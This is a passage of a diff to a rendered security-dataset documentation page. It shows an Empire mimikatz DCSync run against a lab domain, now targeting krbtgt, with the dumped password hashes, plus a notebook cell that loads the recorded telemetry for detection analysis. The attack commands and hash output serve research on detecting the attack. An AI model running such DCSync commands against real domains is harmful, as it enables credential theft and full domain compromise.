+  <span class="o">----</span>   <span class="o">--------</span>    <span class="o">-------</span>                   <span class="o">-----------</span>
+  <span class="n">Agent</span>  <span class="kc">True</span>        <span class="mi">1</span><span class="n">EHYPBVC</span>                  <span class="n">Agent</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>                 
+  <span class="n">user</span>   <span class="kc">True</span>        <span class="n">krbtgt</span>                    <span class="n">Username</span> <span class="n">to</span> <span class="n">extract</span> <span class="n">the</span> <span class="nb">hash</span> <span class="k">for</span>        
+                                              <span class="p">(</span><span class="n">domain</span>\<span class="n">username</span> <span class="nb">format</span><span class="p">)</span><span class="o">.</span>               
+  <span class="n">domain</span> <span class="kc">False</span>       <span class="n">theshire</span><span class="o">.</span><span class="n">local</span>            <span class="n">Specified</span> <span class="p">(</span><span class="n">fqdn</span><span class="p">)</span> <span class="n">domain</span> <span class="n">to</span> <span class="n">pull</span> <span class="k">for</span> <span class="n">the</span> 
+                                              <span class="n">primary</span> <span class="n">domain</span><span class="o">/</span><span class="n">DC</span><span class="o">.</span>                      
+  <span class="n">dc</span>     <span class="kc">False</span>       <span class="n">MORDORDC</span><span class="o">.</span><span class="n">theshire</span><span class="o">.</span><span class="n">local</span>   <span class="n">Specified</span> <span class="p">(</span><span class="n">fqdn</span><span class="p">)</span> <span class="n">domain</span> <span class="n">controller</span> <span class="n">to</span>   
+                                              <span class="n">pull</span> <span class="n">replication</span> <span class="n">data</span> <span class="n">from</span><span class="o">.</span>             
+
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">execute</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="mi">1</span><span class="n">EHYPBVC</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_CMD_JOB</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="mi">1</span><span class="n">EHYPBVC</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">1</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">agent</span> <span class="mi">1</span><span class="n">EHYPBVC</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="n">Job</span> <span class="n">started</span><span class="p">:</span> <span class="mi">5</span><span class="n">PKMSU</span>
+
+<span class="n">Hostname</span><span class="p">:</span> <span class="n">WORKSTATION5</span><span class="o">.</span><span class="n">theshire</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4228717743</span><span class="o">-</span><span class="mi">1032521047</span><span class="o">-</span><span class="mi">1810997296</span>
+
+  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46</span>
+<span class="o">.</span><span class="c1">## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span>
 <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">&#39;## v ##&#39;</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="o">.</span><span class="n">letoux</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span> <span class="p">)</span>
   <span class="s1">&#39;#####&#39;</span>        <span class="o">&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="o">.</span><span class="n">com</span>   <span class="o">***/</span>
 
-<span class="n">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span> <span class="c1"># lsadump::dcsync /user:pgustavo /domain:shire.com /dc:HFDC01.shire.com</span>
-<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;shire.com&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
-<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;HFDC01.shire.com&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
-<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;pgustavo&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span> <span class="c1"># lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC.theshire.local</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;theshire.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;MORDORDC.theshire.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+<span class="p">[</span><span class="n">DC</span><span class="p">]</span> <span class="s1">&#39;krbtgt&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
 
-<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">Pedro</span> <span class="n">Gustavo</span>
+<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
 
 <span class="o">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="o">**</span>
 
-<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">pgustavo</span>
-<span class="n">User</span> <span class="n">Principal</span> <span class="n">Name</span>  <span class="p">:</span> <span class="n">pgustavo</span><span class="nd">@shire</span><span class="o">.</span><span class="n">com</span>
+<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
 <span class="n">Account</span> <span class="n">Type</span>         <span class="p">:</span> <span class="mi">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
-<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="mi">00010200</span> <span class="p">(</span> <span class="n">NORMAL_ACCOUNT</span> <span class="n">DONT_EXPIRE_PASSWD</span> <span class="p">)</span>
+<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="mi">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
 <span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span> 
-<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2019</span> <span class="mi">12</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">18</span> <span class="n">PM</span>
-<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2511471446</span><span class="o">-</span><span class="mi">1103646877</span><span class="o">-</span><span class="mi">3980648787</span><span class="o">-</span><span class="mi">1107</span>
-<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="mi">1107</span>
+<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">46</span> <span class="n">AM</span>
+<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4228717743</span><span class="o">-</span><span class="mi">1032521047</span><span class="o">-</span><span class="mi">1810997296</span><span class="o">-</span><span class="mi">502</span>
+<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="mi">502</span>
 
 <span class="n">Credentials</span><span class="p">:</span>
-  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="mi">8</span><span class="n">ece039f32592670b45fc801e2a9157d</span>
-    <span class="n">ntlm</span><span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="mi">8</span><span class="n">ece039f32592670b45fc801e2a9157d</span>
-    <span class="n">lm</span>  <span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="mf">15e09</span><span class="n">e2518ec09060eb8d5e3edca688b</span>
+  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">c2547afe54ff225a546c48805714d000</span>
+    <span class="n">ntlm</span><span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="n">c2547afe54ff225a546c48805714d000</span>
+    <span class="n">lm</span>  <span class="o">-</span> <span class="mi">0</span><span class="p">:</span> <span class="mi">376</span><span class="n">c6c28a8cfd97055be910640a24428</span>
 
 <span class="n">Supplemental</span> <span class="n">Credentials</span><span class="p">:</span>
 <span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">NTLM</span><span class="o">-</span><span class="n">Strong</span><span class="o">-</span><span class="n">NTOWF</span> <span class="o">*</span>
-    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="mi">2</span><span class="n">a41aad084dd4b0f85542de96ec0d713</span>
+    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="n">a69dcd105b2fc3955a3f52ca00a26902</span>
 
 <span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span><span class="o">-</span><span class="n">Newer</span><span class="o">-</span><span class="n">Keys</span> <span class="o">*</span>
-    <span class="n">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">SHIRE</span><span class="o">.</span><span class="n">COMpgustavo</span>
+    <span class="n">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">THESHIRE</span><span class="o">.</span><span class="n">LOCALkrbtgt</span>
     <span class="n">Default</span> <span class="n">Iterations</span> <span class="p">:</span> <span class="mi">4096</span>
     <span class="n">Credentials</span>
-      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">e9090c842bd528e456efc9912d417e0fba163d185cf11e803a75299c112ccf71</span>
-      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">a45b256dcf19e05e7be415c8f8b74df3</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="mi">40</span><span class="n">c4aef2ad988352</span>
+      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="mi">2954</span><span class="n">d183aaca51936dea10ea187e198814fa57b136733ca167b5d3fcc5b6ab2a</span>
+      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">a8811f9942540c8f10c3837a6975d446</span>
+      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">e36d674cc7c8b983</span>
 
 <span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span> <span class="o">*</span>
-    <span class="n">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">SHIRE</span><span class="o">.</span><span class="n">COMpgustavo</span>
+    <span class="n">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">THESHIRE</span><span class="o">.</span><span class="n">LOCALkrbtgt</span>
     <span class="n">Credentials</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">:</span> <span class="mi">40</span><span class="n">c4aef2ad988352</span>
+      <span class="n">des_cbc_md5</span>       <span class="p">:</span> <span class="n">e36d674cc7c8b983</span>
 
 <span class="o">*</span> <span class="n">Packages</span> <span class="o">*</span>
     <span class="n">NTLM</span><span class="o">-</span><span class="n">Strong</span><span class="o">-</span><span class="n">NTOWF</span>
 
 <span class="o">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">WDigest</span> <span class="o">*</span>
-    <span class="mi">01</span>  <span class="mi">581</span><span class="n">eb1df6c6053b76a28a0dce36a8d6f</span>
-    <span class="mi">02</span>  <span class="mi">7527</span><span class="n">b4ed5fdb8d86b3aae51bfa369d09</span>
-    <span class="mi">03</span>  <span class="mi">1</span><span class="n">afb1ea2a11dacbaa9a7de3cdba90d2e</span>
-    <span class="mi">04</span>  <span class="mi">581</span><span class="n">eb1df6c6053b76a28a0dce36a8d6f</span>
-    <span class="mi">05</span>  <span class="mi">7527</span><span class="n">b4ed5fdb8d86b3aae51bfa369d09</span>
-    <span class="mi">06</span>  <span class="mi">71</span><span class="n">ae329e68bc24b2c4aa77275ddbb153</span>
-    <span class="mi">07</span>  <span class="mi">581</span><span class="n">eb1df6c6053b76a28a0dce36a8d6f</span>
-    <span class="mi">08</span>  <span class="n">beb04fe3623809f7bacf7e37109d4d21</span>
-    <span class="mi">09</span>  <span class="n">beb04fe3623809f7bacf7e37109d4d21</span>
-    <span class="mi">10</span>  <span class="n">dcbadc06749ae53ff0a5b12fea3117ca</span>
-    <span class="mi">11</span>  <span class="n">b4fba84ff02a3bf713d6de143ed08a04</span>
-    <span class="mi">12</span>  <span class="n">beb04fe3623809f7bacf7e37109d4d21</span>
-    <span class="mi">13</span>  <span class="n">f70d458543eeb1491b108783723d5250</span>
-    <span class="mi">14</span>  <span class="n">b4fba84ff02a3bf713d6de143ed08a04</span>
-    <span class="mi">15</span>  <span class="n">eb84c71ed69b32bc4def1ad8a50a3fec</span>
-    <span class="mi">16</span>  <span class="n">eb84c71ed69b32bc4def1ad8a50a3fec</span>
-    <span class="mi">17</span>  <span class="mf">58e1</span><span class="n">d74ac34fc6fcc20d947e4bf5e3a9</span>
-    <span class="mi">18</span>  <span class="mi">73</span><span class="n">eb0629757be77aa4a5a9c1a782658a</span>
-    <span class="mi">19</span>  <span class="mi">60</span><span class="n">f5c9eefaacae631e229fd15f70ad92</span>
-    <span class="mi">20</span>  <span class="n">df090cdf058cdbda7bc78a57d2241a9a</span>
-    <span class="mi">21</span>  <span class="mi">286470</span><span class="n">c2e82b1e8316b1a5198b9c72ec</span>
-    <span class="mi">22</span>  <span class="mi">286470</span><span class="n">c2e82b1e8316b1a5198b9c72ec</span>
-    <span class="mi">23</span>  <span class="mi">689</span><span class="n">bbadaae7f867861432adf3e385396</span>
-    <span class="mi">24</span>  <span class="mi">91</span><span class="n">ff8d6376c52d90415254b0444b497b</span>
-    <span class="mi">25</span>  <span class="mi">91</span><span class="n">ff8d6376c52d90415254b0444b497b</span>
-    <span class="mi">26</span>  <span class="n">bc4e42e3164f8e5d01f1b92fc75370ee</span>
-    <span class="mi">27</span>  <span class="mi">535147</span><span class="n">dcae01ac8505ce306cdcbdfb97</span>
-    <span class="mi">28</span>  <span class="mi">1</span><span class="n">aa7a460e6e4b2a1431c819b26626241</span>
-    <span class="mi">29</span>  <span class="mi">6348</span><span class="n">ec8df577d8d1eb401cc5e29ee763</span>
+    <span class="mi">01</span>  <span class="mi">774</span><span class="n">cc07151941eb115c0fd700fa5715b</span>
+    <span class="mi">02</span>  <span class="mi">6</span><span class="n">a75ae70376df6a3a3e23f560890ac90</span>
+    <span class="mi">03</span>  <span class="n">cd5fa9ee1e6ab120cd6edb6970f56f38</span>
+    <span class="mi">04</span>  <span class="mi">774</span><span class="n">cc07151941eb115c0fd700fa5715b</span>
+    <span class="mi">05</span>  <span class="mi">6</span><span class="n">a75ae70376df6a3a3e23f560890ac90</span>
+    <span class="mi">06</span>  <span class="mi">168</span><span class="n">d6e12549fcbfa3931ffe79e6a978f</span>
+    <span class="mi">07</span>  <span class="mi">774</span><span class="n">cc07151941eb115c0fd700fa5715b</span>
+    <span class="mi">08</span>  <span class="n">c2fc61fda20bbacb17fb29b10d7b8144</span>
+    <span class="mi">09</span>  <span class="n">c2fc61fda20bbacb17fb29b10d7b8144</span>
+    <span class="mi">10</span>  <span class="mi">2985</span><span class="n">ad74f9f6f53e7533662687998542</span>
+    <span class="mi">11</span>  <span class="mi">4</span><span class="n">f58b2e2f9e8505a4b364b5c7bb0f0c5</span>
+    <span class="mi">12</span>  <span class="n">c2fc61fda20bbacb17fb29b10d7b8144</span>
+    <span class="mi">13</span>  <span class="mi">61</span><span class="n">c34cf9f0bb6f8062250ffff84cda07</span>
+    <span class="mi">14</span>  <span class="mi">4</span><span class="n">f58b2e2f9e8505a4b364b5c7bb0f0c5</span>
+    <span class="mi">15</span>  <span class="mi">8</span><span class="n">a1d00b5e9c900715124c0998c19b909</span>
+    <span class="mi">16</span>  <span class="mi">8</span><span class="n">a1d00b5e9c900715124c0998c19b909</span>
+    <span class="mi">17</span>  <span class="n">da88e05b3fe5adc93f5838eb33fadb98</span>
+    <span class="mi">18</span>  <span class="mi">45</span><span class="n">d131a894f854b5400167647aa5ae0f</span>
+    <span class="mi">19</span>  <span class="mi">2</span><span class="n">a1e106ba660636a95def3aad248ca6c</span>
+    <span class="mi">20</span>  <span class="n">c05fa8a38b50e8c9088d3a64a7659817</span>
+    <span class="mi">21</span>  <span class="mi">28</span><span class="n">c03b871631ef39fc8cbc7fbb8e52e8</span>
+    <span class="mi">22</span>  <span class="mi">28</span><span class="n">c03b871631ef39fc8cbc7fbb8e52e8</span>
+    <span class="mi">23</span>  <span class="mf">5e1</span><span class="n">dceb9c5260211633323b398af827d</span>
+    <span class="mi">24</span>  <span class="n">e3b40de14a439d9c18c57cc60002c5f5</span>
+    <span class="mi">25</span>  <span class="n">e3b40de14a439d9c18c57cc60002c5f5</span>
+    <span class="mi">26</span>  <span class="n">e52cde43b834f641f9f80190b29064a7</span>
+    <span class="mi">27</span>  <span class="mi">3</span><span class="n">b2e4b4ad448b19043d422dc9bf4fadc</span>
+    <span class="mi">28</span>  <span class="mi">0</span><span class="n">c45e5c4ef958888593d806c650f0e3d</span>
+    <span class="mi">29</span>  <span class="mi">1822249537162</span><span class="n">bad7b9808ae6b51c627</span>
 </pre></div>
 </div>
 </div>
@@ -941,7 +997,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_dcsync.tar.gz&quot;</span>
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
@@ -953,13 +1009,14 @@
 <div class="cell docutils container">
 <div class="cell_input docutils container">
 <div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
-    <span class="sd">&#39;&#39;&#39;</span>
-<span class="sd">SELECT *</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT Hostname,Channel,EventID, Count(*) as count</span>
 <span class="sd">FROM mordorTable</span>
-<span class="sd">    &#39;&#39;&#39;</span>
+<span class="sd">GROUP BY Hostname,Channel,EventID</span>
+<span class="sd">ORDER BY count DESC</span>
+<span class="sd">&#39;&#39;&#39;</span>
 <span class="p">)</span>
-<span class="n">df</span><span class="o">.</span><span class="n">printSchema</span><span class="p">()</span>
-        
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="n">truncate</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
 </pre></div>
 </div>
 </div>
@@ -996,8 +1053,8 @@
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="SDWIN-191027054517.html" title="previous page">Interactive Task Manager Lsass dump</a>
-    <a class='right-next' id="next-link" href="SDWIN-190518235535.html" title="next page">Empire Mimikatz Export Master Key</a>
+    <a class='left-prev' id="prev-link" href="SDWIN-190625103712.html" title="previous page">Empire Mimikatz SAM Extract Hashes</a>
+    <a class='right-next' id="next-link" href="SDWIN-190518235535.html" title="next page">Empire Mimikatz Backup Keys</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
